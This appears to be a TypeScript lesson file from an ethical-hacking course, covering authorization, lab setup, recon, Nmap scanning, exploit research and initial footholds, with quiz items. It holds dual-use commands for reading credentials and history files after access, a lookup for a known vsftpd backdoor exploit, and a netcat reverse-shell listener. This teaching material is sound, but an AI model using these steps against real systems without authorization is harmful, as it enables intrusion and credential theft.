import type { Level } from '../types'

const level: Level = {
  id: 'beginner',
  title: 'Offensive Linux — ethics, lab and method',
  summary:
    'Authorized offensive security from zero. The law, authorization and scope that make this legal; a safe lab of your own machines; the penetration-testing methodology (recon → enumerate → exploit → post-exploit → report); and the Linux fluency and enumeration mindset that everything else builds on. Nothing here is practised anywhere but systems you own or are contracted to test.',
  outcomes: [
    'State the legal and ethical rules that make offensive testing legitimate',
    'Build an isolated lab of machines you own to practise on',
    'Explain the penetration-testing methodology and its phases',
    'Adopt the enumeration-first mindset of a tester',
    'Use the Linux shell and tools as an attacker reads a system',
    'Understand how a target is approached, on legal targets only',
  ],
  steps: [
    {
      id: 'rlin-b-01',
      title: 'The rules that make this legal',
      read: `Offensive security — penetration testing, red teaming, ethical hacking — is the practice of attacking systems **to find and fix their weaknesses before real attackers do**. It is a legitimate, valuable profession *only* when it is authorized. The exact same commands are a paid engagement on one system and a serious crime on another; **the only difference is permission.** This is the first and most important lesson, and it governs everything in this track.

## The law is not optional

Accessing a computer system without authorization is a criminal offence almost everywhere: the **Computer Fraud and Abuse Act** (US), the **Computer Misuse Act** (UK), and equivalents worldwide. Intent does not matter, "I only looked" does not matter, and "I was going to tell them" does not matter — unauthorized access is a crime. People have been prosecuted for exactly the techniques this track teaches, applied to systems they did not have permission to test.

## Authorization must be explicit and in writing

Legitimate testing rests on **written authorization** before anything begins:

- **Scope** — precisely which systems, IP ranges, applications and accounts you may test, and which are off-limits. You never touch anything outside scope.
- **Rules of engagement** — what techniques are permitted (is denial-of-service allowed? social engineering? physical?), the testing window, and who to contact.
- **Authority** — signed by someone who actually owns or controls the systems and can grant permission.

A pentest without this document is not a pentest; it is a crime with good intentions.

## Where you may practise

Because you will not have authorization for real systems while learning, this whole track is built around targets that are legal by design:

- **Your own lab** — virtual machines you create and own (this level sets one up).
- **Deliberately vulnerable practice systems** — designed and licensed to be attacked.
- **CTF platforms and online labs** — Hack The Box, TryHackMe, PortSwigger Academy, PentesterLab, VulnHub — which grant permission as part of using them.
- **Bug bounty programs** — but only strictly within their published scope and rules.

## The ethical frame

Beyond the law, professional offensive security is bound by ethics: **do no harm** (don't damage data or availability beyond what the scope allows), **respect privacy** (you will see sensitive data — handle it responsibly), **report honestly and confidentially**, and remember the **purpose is defensive** — you attack so that defenders can fix. Learning to think like an attacker is what makes you able to defend; that is why this exists.

Internalise this now: every technique that follows is to be used only on systems you own or are explicitly authorized to test. Keep it there, always.`,
      sample: {
        lang: 'text',
        caption: 'The same actions, two completely different situations',
        code: `nmap -sV target ; found a vulnerable service ; got a shell

  ON A SYSTEM YOU ARE AUTHORIZED TO TEST:
    -> a finding in a report, a vulnerability the owner can fix.
       Legitimate, valuable, professional work.

  ON A SYSTEM YOU ARE NOT AUTHORIZED TO TEST:
    -> unauthorized access. A crime under the CFAA / Computer Misuse
       Act / local law. Prosecutable regardless of intent.

The commands are identical. AUTHORIZATION is the entire difference.`,
        output: `Offensive security is legal ONLY with explicit written
authorization defining scope and rules of engagement. Practise
only on your own lab, licensed vulnerable systems, CTF/lab
platforms, or bug bounties within their published scope.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the single factor that separates legitimate penetration testing from a criminal offence?',
        options: [
          'Whether the tester intends to cause harm',
          'Explicit authorization — written permission from someone who controls the systems, defining scope and rules of engagement — because the same techniques are legal on authorized targets and a crime on unauthorized ones, regardless of intent',
          'Whether the tester ultimately reports the findings',
          'Whether advanced tools were used',
        ],
        answer: 1,
        explain:
          'The techniques in offensive security are inherently dual-use: identical to those a criminal uses, and legal only because permission was granted. Laws like the CFAA and the Computer Misuse Act criminalise unauthorized access itself — intent to help, or a plan to report afterwards, does not make unauthorized testing lawful, and people have been prosecuted for exactly that. Legitimate work always rests on explicit written authorization that defines what may be tested and how, granted by someone with the authority to grant it. Without it, there is no ethical hacking, only crime.',
        hint: 'Intent, tools and later reporting do not make it legal. What single thing does?',
      },
    },

    {
      id: 'rlin-b-02',
      title: 'Building a lab you own',
      read: `Since you will only practise on systems you own or are authorized to test, the first practical step is to build a **lab** — an isolated environment of virtual machines you control completely, where you can attack freely and legally.

## The pieces

- **A hypervisor** — VirtualBox or VMware (free tiers exist) to run virtual machines on your own computer.
- **An attacker VM** — a Linux distribution loaded with security tools. **Kali Linux** and **Parrot OS** are purpose-built for this and come with the standard toolkit preinstalled. This is where you work *from*.
- **Target VMs** — deliberately vulnerable machines you attack. **VulnHub** publishes downloadable vulnerable VMs; **Metasploitable** is a classic intentionally-insecure Linux target; you can also build your own.
- **Snapshots** — save a clean state before each experiment and roll back in seconds, exactly as in the defensive tracks.

## Isolate the lab — this matters legally and safely

Configure the VMs on a **host-only or internal network**, so they can talk to *each other* but **cannot reach your real network or the internet**. Two reasons:

- **Legality/safety** — an attack tool misconfigured against the wrong address, or a vulnerable target that gets compromised by a real internet attacker, must not be able to reach anything real. Isolation guarantees your practice stays inside the lab.
- **Realism** — a self-contained network mirrors the target environment of a real engagement.

If you must download updates or tools onto the attacker VM, do it deliberately, then return the lab to isolation for attacking.

## Online alternatives

If running VMs locally is impractical, **online lab platforms** — Hack The Box, TryHackMe, PentesterLab — provide vulnerable targets in the cloud with permission built into their terms of service. They connect you over a VPN to an isolated environment. These are excellent, legal, and require no local setup; much of this track can be practised there.

## Why a lab is non-negotiable

You cannot learn offensive security by reading alone, and you cannot practise on real systems. The lab is what makes hands-on learning both possible and lawful: a place where every technique in this track can be tried, broken and understood, against targets that exist to be attacked, with zero risk to anyone. Set it up before going further, and treat it as the *only* place these techniques are used — until you have a signed authorization for something else.`,
      sample: {
        lang: 'bash',
        caption: 'A minimal isolated lab, and confirming isolation',
        code: `# In the hypervisor:
#   Attacker VM: Kali Linux    (network: Host-Only / Internal)
#   Target VM:   Metasploitable / a VulnHub box (same Host-Only net)
#   Snapshot both at a clean state.

# From the attacker VM, confirm you can reach the target...
ping -c1 192.168.56.101        # the target, on the host-only net

# ...but NOT the real internet (isolation working):
ping -c1 8.8.8.8               # should fail on an isolated net`,
        output: `64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.4 ms
--- target reachable inside the lab ---
ping: connect: Network is unreachable
--- internet NOT reachable: the lab is isolated as intended ---`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why should a practice lab’s virtual machines be on a host-only or internal network isolated from your real network and the internet?',
        options: [
          'To make the VMs run faster',
          'So attack tools and deliberately vulnerable targets stay contained — a misdirected tool or a vulnerable box cannot reach your real network or the internet — which keeps your practice both safe and lawfully confined to systems you own',
          'Because Kali Linux cannot use the internet',
          'Because isolation is required to install security tools',
        ],
        answer: 1,
        explain:
          'Isolation serves safety and legality together. Attack tooling can be misconfigured and hit an unintended address, and a deliberately vulnerable target is, by design, easy for anything that can reach it to compromise — so it must not be exposed to your real network or the internet. A host-only/internal network lets the lab machines interact with each other while guaranteeing that everything you do stays inside systems you own. When you need to update the attacker VM you do so deliberately, then return to isolation for attacking.',
        hint: 'What must never happen if an attack tool is pointed at the wrong address, or a vulnerable box gets popped?',
      },
    },

    {
      id: 'rlin-b-03',
      title: 'The penetration-testing methodology',
      read: `Offensive security is not random button-pushing; it follows a **methodology** — a repeatable set of phases that mirrors how a real attacker operates and ensures a test is thorough. Knowing the phases gives you a map for everything in this track.

## The phases

1. **Reconnaissance** — gathering information about the target *before* touching it. Passive recon uses public sources (DNS, search engines, public records, leaked data) without interacting with the target; active recon begins to probe it. The more you learn here, the more effective everything after is.

2. **Scanning / enumeration** — actively discovering what is there: live hosts, open ports, running services and their versions, users, shares, application details. This is the heart of testing and the phase beginners under-invest in. **Enumeration is where engagements are won** — the more thoroughly you map the target, the more attack surface you find.

3. **Exploitation / gaining access** — using a discovered weakness (a vulnerable service, weak credentials, a misconfiguration) to get an initial foothold on the target.

4. **Post-exploitation** — what you do once you are in: understanding where you landed, escalating privileges (from a normal user to root/admin), gathering credentials and data, and moving to other systems (lateral movement / pivoting). Access alone is often not the goal; demonstrating *impact* is.

5. **Reporting** — the actual deliverable. A professional test produces a clear report: what was found, how it was exploited, the business impact, and — crucially — **how to fix it**. The report is the product; a finding nobody can act on has no value.

## The cyclical reality

In practice the phases loop: post-exploitation on one host reveals new targets, so you enumerate and exploit again, going deeper. A real engagement is recon → enumerate → exploit → post-exploit → *enumerate the newly reached systems* → and so on, until the objectives are met or the scope's edge is reached.

## Frameworks that formalise it

Industry frameworks structure this: the **Cyber Kill Chain**, **MITRE ATT&CK** (a detailed catalogue of the techniques used in each phase — the same one defenders map against), and testing standards like **PTES** (Penetration Testing Execution Standard) and the **OWASP Testing Guide** for web. You do not need to memorise them yet; the point is that offensive work is a disciplined process.

## Why the methodology matters

It keeps you **thorough** (you won't miss attack surface), **efficient** (you know what to do next), and **professional** (the phases map to a report structure and to the rules of engagement). The recurring theme of this track — and the biggest lever for a beginner — is that **enumeration is everything**: patient, complete information-gathering is what turns "I couldn't get in" into "here are five ways in."`,
      sample: {
        lang: 'text',
        caption: 'The methodology as a loop, not a line',
        code: `  RECON ---> ENUMERATE ---> EXPLOIT ---> POST-EXPLOIT ---> REPORT
                ^                              |
                |     newly reached hosts      |
                +------------------------------+
                (enumerate again, go deeper)

Where beginners go wrong:  rush to EXPLOIT, skip ENUMERATION.
Where engagements are won:  patient, complete ENUMERATION -
   more attack surface found = more ways in.
The deliverable is the REPORT: findings + impact + how to FIX.`,
        output: `Method: recon -> enumerate -> exploit -> post-exploit -> report,
looping as new systems are reached. Enumeration is the phase that
decides success. The report - findings, impact, and remediation -
is the actual product of an authorized engagement.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Experienced testers say engagements are "won in enumeration". Why is the enumeration phase so decisive?',
        options: [
          'Because it is the fastest phase to complete',
          'Because thoroughly discovering the target’s hosts, services, versions, users and configuration reveals the attack surface — the more completely you map it, the more ways in you find; rushing to exploitation while skipping enumeration is the classic reason a tester fails to find a foothold',
          'Because exploitation is unnecessary if you enumerate',
          'Because enumeration is the phase included in the report',
        ],
        answer: 1,
        explain:
          'Every foothold begins with something you discovered — a service, a version with a known flaw, a weak credential, a misconfiguration, an exposed share. If you did not enumerate it, you cannot exploit it. Beginners commonly rush to run exploits and conclude a target is secure when in fact they simply never found the vulnerable surface. Patient, complete enumeration is the highest-leverage skill in offensive testing precisely because it determines how much attack surface — and therefore how many potential ways in — you ever get to work with.',
        hint: 'You can only exploit what you found. What phase finds it?',
      },
    },

    {
      id: 'rlin-b-04',
      title: 'The enumeration mindset',
      read: `Since enumeration decides engagements, the beginner's real work is developing the **mindset** behind it: relentless curiosity, thoroughness, and the habit of asking "what else is here, and what could it let me do?" This is a way of thinking more than a set of commands.

## What the mindset looks like

- **Assume there is more.** A target that looks empty almost never is — you just haven't found the surface yet. When stuck, the answer is nearly always "enumerate more", not "give up" or "throw more exploits".
- **Follow every thread.** A service version leads to searching for known vulnerabilities. A username leads to guessing more usernames. A directory leads to files. A file leads to credentials or configuration. Each discovery is a thread to pull.
- **Note everything.** Real testers keep meticulous notes — every host, port, version, username, path, credential and oddity — because a detail that seems irrelevant now is often the key later, and because the notes become the report.
- **Think about what each finding enables.** Enumeration is not collecting facts for their own sake; it is building a picture of *paths*. "This runs an old version of X" matters because X's old version has a known flaw. "This user exists" matters because you might reach their account.
- **Be patient and systematic.** Cover the whole surface methodically rather than fixating on the first interesting thing. Attackers who win are thorough, not lucky.

## Enumeration is layered

You enumerate at every level, repeatedly:

- **Network** — which hosts are alive, which ports are open.
- **Service** — what software and version each open port runs, and how it's configured.
- **Application** — the app's pages, parameters, users, and behaviour.
- **Host (after access)** — the system's users, files, processes, configuration, and — crucially — the paths to higher privilege.

And you re-enumerate after every change in position: gaining a foothold opens up host enumeration; reaching a new network opens up network enumeration again.

## Why this is the beginner's focus

Tools and exploits come later and are the easy part — they are documented and reusable. The scarce skill is the *disciplined thoroughness* that finds the surface those tools then act on. A beginner who internalises "when in doubt, enumerate more" and keeps careful notes will outperform one who memorises exploits but scans carelessly. The rest of this track teaches the specific enumeration techniques for networks, services, applications and hosts — but they are all expressions of this one habit: **look harder, follow every thread, and write it all down.**`,
      sample: {
        lang: 'text',
        caption: 'The mindset: every finding is a thread to pull',
        code: `open port 21 (FTP)  -> what version?  -> vsftpd 2.3.4
   -> search "vsftpd 2.3.4 vulnerability"  -> a known backdoor (in a lab)
open port 80 (HTTP) -> what app?  -> a CMS  -> what version?  -> plugins?
   -> a login page -> what usernames exist? -> default creds?
found a username "jsmith" -> try it elsewhere -> SSH? the app? reuse?
found a config file -> credentials inside? -> where else do they work?

"It looks empty" almost always means "I haven't enumerated enough."
Note EVERYTHING; the irrelevant detail is often the key later.`,
        output: `The enumeration mindset: assume there's more, follow every
thread, note everything, and ask what each finding ENABLES. It's
layered (network -> service -> app -> host) and repeated after
every new position. Thoroughness, not luck or exploit knowledge,
is what wins - "when in doubt, enumerate more."`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A learner scans a target, finds nothing obviously exploitable, and concludes it is secure. What does the enumeration mindset suggest instead?',
        options: [
          'Immediately run every available exploit and hope one works',
          'Assume there is more attack surface not yet found and enumerate more thoroughly — deeper service and version detection, application and directory discovery, following every thread — because "it looks empty" almost always means the surface has not been fully mapped, not that none exists',
          'Move on; a target with no obvious flaw cannot be tested further',
          'Conclude that scanning tools are unreliable',
        ],
        answer: 1,
        explain:
          'Concluding "secure" from a shallow scan is the classic beginner error. Almost every target has more surface than a first pass reveals — undetected service versions, application endpoints, directories, users, or configuration — and the discipline is to enumerate more deeply and follow every thread rather than to give up or to blindly fire exploits at a surface you have not mapped. Throwing exploits at random is both ineffective and, on any real system, reckless; the productive response to "nothing yet" is "look harder", which is exactly the mindset the whole track rests on.',
        hint: 'Does "I found nothing" mean "there is nothing", or "I have not looked hard enough"?',
      },
    },

    {
      id: 'rlin-b-05',
      title: 'The shell, as an attacker reads it',
      read: `Whether you are working from your Kali attacker VM or have just gained a foothold on a Linux target, you live in the **shell**. You met these commands in the defensive Linux track; here the emphasis is on how an *attacker* reads a system with them — the same tools, a different question: "what does this let me do?"

## Orienting on a system you've landed on

The first thing a tester does after getting a shell is **situational awareness** — answering "where am I, who am I, and what can I reach?":

- \`whoami\` / \`id\` — which user am I, and what groups/privileges do I have? (A member of an interesting group, or unexpected privileges, is a lead.)
- \`hostname\`, \`uname -a\`, \`cat /etc/os-release\` — what system and kernel is this? (An old kernel may have a known privilege-escalation exploit.)
- \`ip addr\`, \`ip route\` — what networks can this host see? (Reaching a second network is a pivot opportunity.)
- \`pwd\`, \`ls -la\` — where am I, and what's here (including hidden files)?

## Reading for opportunity

The defender reads the filesystem to spot intrusion; the attacker reads it for **paths upward and outward**:

- \`cat /etc/passwd\` — who are the users? Which have real shells and home directories worth exploring?
- \`ls -la /home/*\`, and the current user's dotfiles — config files, history, SSH keys, notes, credentials left lying around.
- \`sudo -l\` — what can this user run as root? (A single misconfigured entry can be the whole game — a later topic.)
- \`ps aux\`, \`netstat\`/\`ss -tulpn\` — what's running, and what's listening (including services bound only to localhost that aren't exposed to the network but are reachable now that you're on the box)?
- Config files, logs, and \`history\` files — a rich source of credentials and clues.

## The upgrade to a proper shell

An initial foothold often gives a limited, unstable shell (no job control, no tab-completion, breaks on Ctrl-C). Early post-exploitation includes **stabilising it** into a fully interactive TTY (commonly via a Python one-liner spawning \`/bin/bash\`, then adjusting terminal settings) so you can work effectively. Knowing your shell may be fragile — and how to make it usable — is a practical beginner skill.

## Same tools, attacker's questions

The commands are identical to the defensive track; what changes is the question you ask of each answer. The defender asks "is this normal?"; the attacker asks "what does this enable?" Fluency in reading a Linux system — its identity, users, network, processes, and configuration — is the foundation of both host enumeration and privilege escalation, which the amateur and intermediate levels develop in depth.`,
      sample: {
        lang: 'bash',
        caption: 'First moves after landing a shell: situational awareness',
        code: `id                              # who am I, what groups/privileges?
uname -a                        # kernel/OS (old = maybe a known exploit)
ip addr; ip route               # what networks can I reach from here?
sudo -l 2>/dev/null             # what can I run as root?
cat /etc/passwd | grep -v nologin    # real user accounts
ls -la ~ ; cat ~/.bash_history  # config, keys, credentials, clues`,
        output: `uid=1000(web) gid=1000(web) groups=1000(web),4(adm)  <- adm group!
Linux target 3.13.0-24 ... x86_64                    <- old kernel
inet 10.10.10.5/24 ... inet 172.16.0.5/24            <- a SECOND network!
User web may run: (root) NOPASSWD: /usr/bin/find      <- privesc path
~/.bash_history:  mysql -u root -pSuperSecret123       <- a credential
# Same commands as the defender's; the attacker asks "what does
# this ENABLE?" - adm group, old kernel, second net, sudo find, a password.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Immediately after gaining a foothold on a Linux host, why does a tester run commands like `id`, `uname -a`, `ip addr` and `sudo -l`?',
        options: [
          'To make the system run faster',
          'To establish situational awareness — who they are and their privileges, the kernel/OS (a potential privilege-escalation lead), what networks the host can reach (pivot opportunities), and what they can run as root — because understanding the position they have landed in is what reveals the paths upward and outward',
          'To delete their tracks from the logs',
          'Because those commands are required before the shell will work',
        ],
        answer: 1,
        explain:
          'The first job after any foothold is situational awareness: the tester needs to know their identity and privileges, what the system is (an old kernel may carry a known local privilege-escalation exploit), what networks it can see (a second interface is a route to pivot deeper), and what it can do with elevated rights (`sudo -l`). These read-only checks map the position the tester has landed in, and that map is exactly what reveals the routes to higher privilege and to other systems — the same commands a defender uses, asked with the question "what does this enable?"',
        hint: 'What must you know about where you have landed before you can find a way up or across?',
      },
    },

    {
      id: 'rlin-b-06',
      title: 'Passive reconnaissance',
      read: `**Reconnaissance** is the first methodology phase: learning about a target before (and without) attacking it. **Passive recon** gathers information from *public* sources without interacting with the target's systems at all — so it is quiet, and it is done first because it shapes everything after. (On an engagement, you do this only within your authorized scope; while learning, you practise the techniques against your own domains, deliberately-provided targets, or lab scenarios.)

## What passive recon gathers

Using only public data, you build a picture of the target's footprint:

- **Domains and subdomains** — the organisation's web presence. Subdomains often expose forgotten or less-protected systems (\`dev.\`, \`staging.\`, \`vpn.\`, \`mail.\`). Certificate Transparency logs (crt.sh) list certificates issued for a domain, revealing subdomains.
- **DNS records** — \`A\`/\`AAAA\` (addresses), \`MX\` (mail servers), \`TXT\`, \`NS\` — mapping the infrastructure. Tools: \`dig\`, \`nslookup\`, \`host\`.
- **IP ranges and hosting** — which addresses and providers the organisation uses (WHOIS, ASN lookups).
- **Public information (OSINT)** — employee names and emails (for later phishing or username guessing, on authorized engagements), technologies in use, documents with metadata, code in public repositories (sometimes with leaked secrets), and posts revealing internal details. Search engines, with **Google dorking** (advanced operators like \`site:\`, \`filetype:\`, \`inurl:\`), surface a great deal.
- **Leaked credentials** — breach databases reveal passwords exposed elsewhere, which people reuse (checked via services like Have I Been Pwned).

## Why passive first

- It is **invisible to the target** — no packets touch their systems, so nothing is logged or alerted. This matters for stealth on real engagements and models how a real adversary starts.
- It **directs the active phase** — you don't scan blindly; you scan the hosts and services recon revealed, and you look for the technologies you already know are in use.
- It often **finds the way in by itself** — an exposed subdomain, a leaked credential, a secret in a public repository, or a document revealing internal structure can be the foothold before you ever "attack".

## The tools

Frameworks aggregate this: **theHarvester** (emails, subdomains, hosts), **Amass** and **subfinder** (subdomain enumeration), **Shodan** and **Censys** (internet-wide scans of exposed services — you *query their* data rather than scanning yourself), **Maltego** (relationship mapping), and Certificate Transparency search. Together they build the target's external picture from public information alone.

## The defensive mirror

Everything passive recon finds is your **attack surface as an attacker sees it** — which is exactly why defenders do the same exercise against themselves ("attack surface management"): find your exposed subdomains, leaked credentials and public secrets before an adversary does. Understanding offensive recon is directly how an organisation learns what to hide, remove, or defend.`,
      sample: {
        lang: 'bash',
        caption: 'Passive recon: public data, no packets to the target',
        code: `# DNS records from public resolvers (no contact with the target)
dig +short example.com A
dig +short example.com MX

# subdomains from Certificate Transparency logs (public)
curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u

# emails / subdomains / hosts from public sources
theHarvester -d example.com -b all`,
        output: `93.184.216.34
10 mail.example.com
dev.example.com          <- a dev subdomain - often less protected
staging.example.com
vpn.example.com
old.example.com          <- forgotten? worth noting
# All from PUBLIC data - the target's systems logged nothing.
# This shapes the active phase and is the attack surface defenders
# should find against themselves first.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What distinguishes passive reconnaissance from active reconnaissance, and why is passive recon done first?',
        options: [
          'Passive recon uses more powerful tools',
          'Passive recon gathers information only from public sources without interacting with the target’s systems — so it is invisible to the target, is done first because it shapes and directs the active phase, and sometimes reveals a way in (an exposed subdomain, leaked credential or public secret) by itself',
          'Passive recon is illegal while active recon is legal',
          'Passive recon can only find IP addresses',
        ],
        answer: 1,
        explain:
          'Passive recon draws entirely on public data — DNS, Certificate Transparency, WHOIS, search engines, breach databases, public repositories — never touching the target’s systems, so it generates no logs or alerts on their side. It comes first because it is quiet and because what it finds directs the noisier active scanning (you probe the hosts and technologies recon revealed rather than scanning blindly), and it frequently uncovers the foothold on its own via a forgotten subdomain, a leaked credential, or a secret committed to a public repo. The same exercise run against yourself is attack-surface management.',
        hint: 'Which one never sends a packet to the target, and what does that let it do first?',
      },
    },

    {
      id: 'rlin-b-07',
      title: 'Active scanning with Nmap',
      read: `Once recon has mapped the target's footprint, **active scanning** discovers what is actually running. The foundational tool is **Nmap** — you use it constantly, on authorized targets and in your lab. (This step introduces it; the amateur level goes deeper.)

## Host discovery

First, which hosts are alive? \`nmap -sn 10.10.10.0/24\` performs a **ping sweep** across a range, listing responsive hosts — the horizontal view you'd take of a subnet you're authorized to test.

## Port scanning

For each live host, which ports are open (and thus which services are exposed)?

- \`nmap 10.10.10.5\` — a default scan of common TCP ports.
- \`nmap -p- 10.10.10.5\` — **all 65535 ports** (slower, but thorough — services hide on non-standard ports, and a beginner who scans only defaults misses them; the enumeration mindset says scan everything).
- Recall the handshake: Nmap's default SYN scan (\`-sS\`, needs root) sends a SYN and reads SYN-ACK (open) or RST (closed) — the technique you met defensively, now used to map a target.

## Service and version detection — the crucial step

An open port tells you *something* is there; \`-sV\` tells you *what*:

\`\`\`
nmap -sV 10.10.10.5
\`\`\`

This probes each service to identify the software **and its version** — and the version is what you research for known vulnerabilities. "Port 21 open" is a fact; "port 21 runs vsftpd 2.3.4" is a lead, because you can look up whether that version has a known flaw. Add \`-O\` for OS detection and \`-sC\` to run Nmap's default **scripts** (safe checks that pull banners, default credentials hints, and common issues). A common thorough invocation is \`nmap -sVC -p- <target>\`.

## Reading and recording the output

Every open port, service and version goes into your notes as attack surface. For each service you then ask the enumeration questions: what version, is it up to date, is it default-configured, does it need credentials, does it have known vulnerabilities?

## Scanning is loud — and that's a defensive lesson

Active scanning **is noticeable**: it sends many packets and appears in the target's logs and IDS (exactly the scan detection you built in the defensive network track). On a stealthy engagement you'd scan carefully; on a normal authorized test, thoroughness matters more than stealth. Either way, understanding that scanning is detectable — and what it looks like to a defender — is knowledge that serves both sides. In your lab, scan freely; against anything else, only within authorization.

Nmap turns "there is a host" into "here are its services and versions" — the raw material every subsequent phase acts on.`,
      sample: {
        lang: 'bash',
        caption: 'From live hosts to services and versions',
        code: `# 1. which hosts are alive? (authorized range / your lab)
nmap -sn 10.10.10.0/24

# 2. all ports + service/version + default scripts on a target
nmap -sVC -p- 10.10.10.5`,
        output: `Nmap scan report for 10.10.10.5
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.3.4          <- version -> research it
22/tcp   open  ssh      OpenSSH 7.2p2
80/tcp   open  http     Apache 2.4.7
445/tcp  open  smb      Samba 3.x
3306/tcp open  mysql    MySQL 5.5.62
8080/tcp open  http     Jetty (an app on a NON-default port)
# Each version is a lead. Note them all; research each for known
# flaws. Scanning is LOUD - it shows in the target's logs/IDS.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is Nmap’s service/version detection (`-sV`) so much more useful to a tester than simply knowing a port is open?',
        options: [
          'Because it opens the port for exploitation',
          'Because knowing the exact software and version running on a port lets you research whether that version has known vulnerabilities or default configurations — turning "something is listening here" into a concrete, actionable lead',
          'Because it makes the scan stealthier',
          'Because open ports are harmless unless their version is known',
        ],
        answer: 1,
        explain:
          'An open port only says a service exists; the version tells you *which* service, and the version is what you look up against vulnerability databases and known-default configurations. "Port 21 open" is a fact you can do little with, whereas "port 21 runs vsftpd 2.3.4" is a lead you can immediately research for known flaws. That is why version detection (and, with `-sC`, the default scripts that pull further detail) is the pivotal enumeration step — it converts the map of open ports into a list of concrete, researchable attack surface.',
        hint: 'What can you look up once you know not just that a service is there, but exactly which version it is?',
      },
    },

    {
      id: 'rlin-b-08',
      title: 'From version to vulnerability',
      read: `Enumeration produced a list of services and versions. The next question — the bridge to exploitation — is: **does any of this have a known weakness?** This step is about researching vulnerabilities responsibly and understanding how known flaws are catalogued.

## Known vulnerabilities and CVEs

Most vulnerabilities in real software are **already publicly known** and catalogued as **CVEs** (Common Vulnerabilities and Exposures) — each a unique ID (e.g. CVE-2021-44228) describing a specific flaw in a specific product and version range. When your enumeration shows "vsftpd 2.3.4" or "Apache 2.4.7", you search whether that version has known CVEs.

The most reliable way in on real engagements is rarely a novel exploit; it is an **unpatched known vulnerability** — a version behind on patches for which a public advisory (and often public exploit) exists. This is the mirror image of the defensive lesson that patching is the highest-value control: attackers succeed largely because things are not patched.

## Researching a version

- **Search the version plus "vulnerability" or "CVE"** — advisories, vendor notes, and write-ups appear.
- **Vulnerability databases** — the NVD (National Vulnerability Database), CVE listings, and offensive references like **Exploit-DB** (public proof-of-concept exploits) and **searchsploit** (a local, searchable copy of Exploit-DB on Kali).
- **The service's own behaviour** — banners, default pages and error messages often reveal version and configuration, and default-credential lists reveal whether a device or app ships with a known password.

## Reading an exploit before running it

A crucial professional and safety habit: **never run an exploit you don't understand**, even in a lab. Public exploit code can be unreliable, can do more than it claims, and can be malicious (deliberately backdoored "exploits" exist). Read it, understand what it does, and — importantly — only run it against systems you are authorized to test. In your lab you can run things freely because you own the targets; anywhere else, authorization governs.

## Not every version match is exploitable

A version being *listed* in a CVE does not guarantee it is exploitable in this configuration — the vulnerable feature may be disabled, the exploit may need conditions that aren't met, or a backported patch may have fixed it while leaving the version string unchanged. Part of the skill is assessing *whether* a known flaw actually applies here, rather than assuming a version match is a win. This judgement is what separates checking a box from real testing.

## The workflow

Enumerate → for each service and version, research known vulnerabilities → assess which credibly apply to this target → understand the flaw → (on authorized targets or your lab) attempt exploitation. Most of the value is in that research-and-assess step: knowing that "this service is three years out of date and matches a critical CVE with a public exploit" is itself a finding worth reporting, regardless of whether you go on to exploit it.`,
      sample: {
        lang: 'bash',
        caption: 'Turning a version into researched, assessed leads',
        code: `# search a local copy of Exploit-DB for a discovered version
searchsploit vsftpd 2.3.4
searchsploit apache 2.4.7

# then read the write-up / PoC and ASSESS: does it apply HERE?
searchsploit -x exploits/unix/remote/17491.rb    # read before running`,
        output: `------------------------------------- -------------------------
 Exploit Title                        |  Path
------------------------------------- -------------------------
vsftpd 2.3.4 - Backdoor Command Exec  | unix/remote/17491.rb
------------------------------------- -------------------------
# A known backdoor in that exact version -> a strong lead.
# BUT assess: is this the real vsftpd 2.3.4, or a patched/backported
# build with the same version string? Read the exploit; understand
# it; run it ONLY against authorized targets / your lab.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Your scan shows a service whose version matches a critical CVE with a public exploit. Why is it still important to assess whether the flaw actually applies rather than assuming a version match is a guaranteed way in?',
        options: [
          'Because version numbers are always fake',
          'Because a version appearing in a CVE does not guarantee exploitability here — the vulnerable feature may be disabled, the exploit may require conditions not met on this target, or a backported patch may have fixed the flaw while leaving the version string unchanged — so real testing means judging whether the known flaw credibly applies, not just matching a number',
          'Because exploits never work in a lab environment',
          'Because CVEs are not relevant to penetration testing',
        ],
        answer: 1,
        explain:
          'Matching a version to a CVE produces a lead, not a certainty. Distributions frequently backport security fixes without bumping the visible version, so a build that looks vulnerable may already be patched; the vulnerable code path may be disabled by configuration; and public exploits often depend on specific conditions (architecture, options, reachable features) that this target may not meet. Assessing whether the flaw genuinely applies — and reading the exploit to understand it — is what separates disciplined testing from box-ticking, and it is also why "version out of date, matching a critical CVE" is itself a reportable finding even before any exploitation is attempted.',
        hint: 'Can a patched system still report the same version string, and can an exploit need conditions that are not present?',
      },
    },

    {
      id: 'rlin-b-09',
      title: 'Gaining an initial foothold',
      read: `**Exploitation** — gaining initial access — is the phase beginners imagine when they think of hacking, but by now you can see it as the *smallest* part, resting on all the enumeration before it. On authorized targets and in your lab, an initial foothold typically comes from one of a few well-understood routes.

## The common routes to a foothold

- **A vulnerable network service** — a service with a known remote flaw (the CVE research of the last step) that lets you run code or read files. The vsftpd backdoor, a vulnerable web app, an outdated service — enumeration found it, research confirmed it, exploitation uses it.
- **Weak or default credentials** — an admin panel, database, SSH, or device still using \`admin/admin\`, a default vendor password, or a weak password you can guess or brute-force. This is extremely common in the real world and often the easiest way in.
- **A web application flaw** — the OWASP classes from the defensive web track (SQL injection, file upload leading to a web shell, and so on), which the offensive web track covers in depth.
- **Credential reuse / leaked credentials** — a password exposed in a breach and reused, found during passive recon.
- **Misconfiguration** — an exposed admin interface, a world-readable share containing secrets, an anonymous FTP login, a service that shouldn't be internet-facing.

## The reverse shell

The most common goal of exploitation is a **shell** on the target. Often this is a **reverse shell**: the exploited target connects *out* to a listener you control (rather than you connecting in), because outbound connections frequently get through firewalls that block inbound ones (recall the defensive lesson that egress filtering is under-used). You start a listener (\`nc -lvnp 4444\`), trigger the target to connect back, and you have command-line access. This is exactly the reverse-shell pattern the defensive tracks taught you to *detect* — now seen from the other side.

## Frameworks

